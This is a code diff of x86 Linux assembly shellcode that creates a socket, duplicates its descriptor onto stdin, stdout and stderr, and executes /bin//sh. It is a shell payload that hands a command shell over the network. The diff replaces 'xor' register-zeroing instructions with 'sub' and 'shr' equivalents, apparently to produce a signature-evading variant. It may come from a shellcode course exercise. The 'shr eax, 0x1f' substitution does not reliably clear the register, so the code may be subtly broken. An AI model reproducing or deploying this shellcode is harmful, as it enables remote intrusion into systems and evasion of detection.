@@ -8,8 +8,8 @@ global _start:
 
 _start:
   ; socketcall (0x66)
-  ;   syscall SYS_SOCKET (0x01) - int socket(int domain, int type, int protocol);
-  xor eax, eax
+  ;   syscall SYS_SOCKET (0x01) - int socket(int domain, int type, int protocol); 
+  sub eax, eax
   xor ebx, ebx
   mov al, 0x66
   mov bl, 0x01
@@ -58,11 +58,11 @@ _start:
   ; (0 - stdin, 1 - stdout, 2 - stderr) 
 
   ; let's put all this in a loop
-  xor ecx, ecx
+  sub ecx, ecx
 
   DUPCOUNT:
   ; int dup2(int oldfd, int newfd);
-  xor eax, eax
+  shr eax, 0x1f
   mov al, 0x3f
 
   ; ebx (socket descriptor, being copied over from esi saved earlier)
@@ -80,16 +80,17 @@ _start:
 
   ; execve (0x0b) 
   ;   /bin//sh
-  xor eax, eax
+  shr eax, 0x1f
   ; xor ebx, ebx
   push eax     ; reserve some bytes in the stack to work with
 
   mov al, 0x0b
   push 0x68732f2f   ; //sh
   push 0x6e69622f   ; /bin
+
   mov ebx, esp
 
-  xor ecx, ecx
+  sub ecx, ecx
 
   ; syscall
   int 0x80
